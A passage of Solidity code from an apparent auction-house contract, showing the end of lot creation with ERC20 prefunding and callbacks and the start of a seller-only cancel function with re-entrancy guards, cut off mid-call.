standard ERC20 transfer and then call the onCreate callback\n            else {\n                Transfer.transferFrom(\n                    routing_.baseToken, msg.sender, address(this), lotCapacity, true\n                );\n                _onCreateCallback(routing_, lotId, lotCapacity, false);\n            }\n        } else {\n            // Call onCreate callback with no prefunding\n            _onCreateCallback(routing_, lotId, lotCapacity, false);\n        }\n\n        emit AuctionCreated(lotId, routing.auctionReference, infoHash_);\n    }\n\n    /// @notice     Cancels an auction lot\n    /// @dev        This function performs the following:\n    ///             - Checks that the lot ID is valid\n    ///             - Checks that caller is the seller\n    ///             - Calls the auction module to validate state, update records and determine the amount to be refunded\n    ///             - If prefunded, sends the refund of payout tokens to the seller\n    ///\n    ///             The function reverts if:\n    ///             - The lot ID is invalid\n    ///             - The caller is not the seller\n    ///             - The respective auction module reverts\n    ///             - The transfer of payout tokens fails\n    ///             - re-entrancy is detected\n    ///\n    /// @param      lotId_      ID of the auction lot\n    function cancel(uint96 lotId_, bytes calldata callbackData_) external nonReentrant {\n        // Validation\n        _isLotValid(lotId_);\n\n        Routing storage routing = lotRouting[lotId_];\n\n        // Check ownership\n        if (msg.sender != routing.seller) revert NotPermitted(msg.sender);\n\n        // Cancel the auction on the module\n        _getModuleForId(lotId_).cancelAuction(lotId_);\n\n        // If the auction is prefunded and supported, transfer the remaining capacity to the seller\n        if (routing.funding > 0) {\n            uint96 funding = routing.funding;\n\n            // Set to 0 before transfer to avoid re-entrancy\n            routing.funding = 0;\n\n            // Transfer the base tokens to the appropriate contract\n            Transfer.transfer(\n                routing.baseToken,\n                _getAddressGivenCallbackBaseTokenFlag("
    }
  ]
}